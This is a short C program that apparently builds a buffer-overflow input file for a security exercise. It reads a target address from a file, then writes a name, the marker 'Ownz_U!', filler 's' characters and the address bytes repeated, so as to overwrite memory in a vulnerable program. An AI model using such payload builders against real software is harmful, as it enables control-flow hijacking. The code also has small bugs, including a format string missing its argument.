#include<stdio.h>

int main (void)
{
    FILE *fp_in,*fp_out;

    char str1[]="chaitali";
    //char str2[] = "sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss";
    char str_own[] = "Ownz_U!";
    char str4 = '\0';
    char str5[] = "sssssssssssssssssssssssssss";
    int i;
    unsigned long address;
    fp_in = fopen("ipForIp","r");
    if(fp_in != NULL)
    {
      fscanf(fp_in,"%lx",&address);
    }
    //        printf("\nthe address I got = %lx\n",address);
	//    address = address + 0x10;
    unsigned char add[] = {(address >> 40) & 0xff,(address >> 32) & 0xff,(address >> 24) & 0xff,(address >> 16) & 0xff,(address >> 8) & 0xff,address & 0xff};
    // for(i=5;i>=0;i--)
    // printf("%lx\n",add[i]);
    fp_out=fopen("file", "w");

    if(fp_out!=NULL)
    {
     // fprintf(fp_out,"%s\n%s%c%s%c", str1,str2,str4,str2,str4);
       fprintf(fp_out,"%s\n%s%c%s", str1,str_own,str4,str5);
       for(i=0;i<8;i++)
	 fprintf(fp_out,"%s",str5);
      fprintf(fp_out,"%s%c","ssss");
       for(i=5;i>=0;i--)
        fprintf(fp_out,"%c",add[i]);
       
       fprintf(fp_out,"%c%c",str4,str4);
       for(i=5;i>=0;i--)
        fprintf(fp_out,"%c",add[i]);
       
      fclose(fp_out);
    }
    else
        printf("The file \"my_file\" couldn't be opened\n");

    return 0;
}
